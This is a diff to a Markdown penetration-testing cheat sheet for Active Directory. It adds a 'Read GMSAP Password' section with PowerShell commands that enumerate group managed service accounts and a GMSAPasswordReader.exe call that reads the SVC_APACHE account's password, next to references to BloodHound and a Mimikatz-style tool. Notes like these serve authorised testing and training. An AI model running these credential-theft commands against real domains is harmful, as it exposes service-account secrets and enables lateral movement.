@@ -142,12 +142,12 @@ kali: username:neo4j, pass:kali
 kali: clear database
 kali: upload data
 ```
-
-Functions
+###### Read GMSAP Password
 ```
+Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
+Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
 .\GMSAPasswordReader.exe --accountname=SVC_APACHE
 ```
-
 ### Authentication
 ###### Minikatz(require local admin)
 Load DemoEXE and run it locally.  
